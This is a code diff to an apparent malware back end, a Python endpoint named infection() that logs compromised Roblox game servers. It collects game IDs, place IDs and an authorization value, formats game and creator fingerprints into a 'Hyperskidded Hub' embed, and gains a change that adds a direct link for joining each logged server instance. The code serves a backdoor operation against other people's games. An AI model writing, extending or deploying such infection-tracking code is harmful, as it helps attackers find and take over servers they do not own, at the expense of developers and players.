@@ -115,7 +115,6 @@ def getGameInfo(universeId: int):
                 "genre_l2": data.get("genre_l2"),
                 "sourceName": data.get("sourceName"),
                 "maxPlayers": data.get("maxPlayers"),
-                "isAllGenre": data.get("isAllGenre"),
                 "favoritedCount": data.get("favoritedCount")
             }
         else:
@@ -137,6 +136,7 @@ def infection():
 
     # important stuff
     gameid = data.get("game-id", "?") ##
+    placeid = data.get("place-id", "?")
     authorization = data.get("authorization", "?") #
 
     # server fingerprint
@@ -156,7 +156,6 @@ def infection():
     genrel2 = gamedata.get("genre_l2", "?") # 
     sourcename = gamedata.get("sourceName", "?") #
     maxplayers = str(gamedata.get("maxPlayers", "?")) ##
-    isallgenre = str(gamedata.get("isAllGenre", "?")) ##
     favoritedcount = str(gamedata.get("favoritedCount", "?")) ##
 
     # creator fingerprint
@@ -174,12 +173,12 @@ def infection():
             "embeds": [
                 {
                     "title": "Hyperskidded Hub",
-                    "description": "A running Job ID has been logged.",
+                    "description": f"A running Job ID has been logged.\n> Join the server using [this](https://www.roblox.com/games/start?placeId={placeid}&serverInstanceId={jobid}) link.",
                     "color": 4653192,
                     "fields": [
                         {
                             "name": "> Game Fingerprint",
-                            "value": f"> `gameId:` {gameid}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {playing}\n> `visits:` {visits}\n> `maxPlayers:` {maxplayers}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `isAllGenre:` {isallgenre}\n> `favoritedCount:` {favoritedcount}",
+                            "value": f"> `gameId:` {gameid}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {playing}\n> `visits:` {visits}\n> `maxPlayers:` {maxplayers}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `favoritedCount:` {favoritedcount}",
                             "inline": True
                         },
                         {
